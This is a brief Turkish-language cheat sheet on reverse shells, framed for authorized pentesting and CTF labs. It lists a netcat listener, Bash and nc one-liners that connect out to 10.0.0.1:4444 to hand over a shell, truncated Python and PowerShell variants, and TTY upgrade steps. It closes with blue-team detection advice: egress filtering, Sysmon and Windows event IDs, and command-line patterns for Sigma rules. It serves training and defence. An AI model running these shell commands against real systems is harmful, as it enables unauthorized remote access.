# Reverse Shell'ler (yetkili pentest/CTF) + Blue Team Tespiti

> Yalnizca SAHIBI OLDUGUN / IZIN VERILEN sistemlerde. Yetkisiz kullanim yasa disidir.

## Dinleyici (saldirgan tarafi)
- `nc -lvnp 4444` (veya `rlwrap nc -lvnp 4444` daha iyi giris).

## Yaygin reverse shell tek-satirlari (lab/CTF referansi)
- Bash: `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`
- Python: `python3 -c 'import socket,subprocess,os;...'` (standart pty spawn).
- nc: `nc 10.0.0.1 4444 -e /bin/sh` (bazi surumlerde).
- PowerShell: `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(...)..."`.
- Hazir uretim: `msfvenom`, payloadlar; pentestmonkey/HackTricks cheat-sheet'leri.

## TTY yukseltme
- `python3 -c 'import pty;pty.spawn("/bin/bash")'`, ardindan `Ctrl+Z; stty raw -echo; fg`.

## Blue Team — Tespit & Savunma (asil onemli kisim)
- **Egress filtreleme**: giden baglantilari kisitla; beklenmedik yuksek port -> alarm.
- **Surec-ag korelasyonu**: `bash`/`powershell`/`nc`'nin disari baglanmasi supheli (EDR, Sysmon Event ID 3).
- **Komut satiri denetimi** (Windows 4688 / Sysmon 1): `-e /bin/sh`, `/dev/tcp/`, `Net.Sockets.TCPClient` desenleri.
- **Sigma kurallari** ile bu desenleri yakala; PowerShell ScriptBlock log (4104).
- Uygulama beyaz listesi, en az yetki, makro/`nc` kisitlama.
